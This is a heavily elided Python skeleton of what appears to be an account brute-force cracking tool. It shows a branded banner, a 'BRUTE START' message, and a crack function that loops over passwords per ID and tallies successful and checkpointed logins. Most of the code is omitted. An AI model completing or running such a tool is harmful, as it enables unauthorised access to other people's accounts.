...
def banner():
	...
	ban=''' © MASTER MIND M-ULLAH TRICKER
...
def login_lagi334():
	...
	try:
		...
		cetak(nel('\t             WELLCOME : [green]𝐌✌︎ 𝐔𝐋𝐋𝐀𝐇[purple] '))
...
def passwrd():
	...
	cetak(nel('[bold cyan]              BRUTE START WAIT FOR A WHILE 😂[bold cyan]')) 
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}𝐌✌︎𝐔𝐋𝐋𝐀𝐇-𝐗𝐃-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	...
	for pw in pwv:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				cetak(nel('[green]      ❤️ 𝐌✌︎𝐔𝐋𝐋𝐀𝐇-𝐎𝐊 ❤️[green]')) 
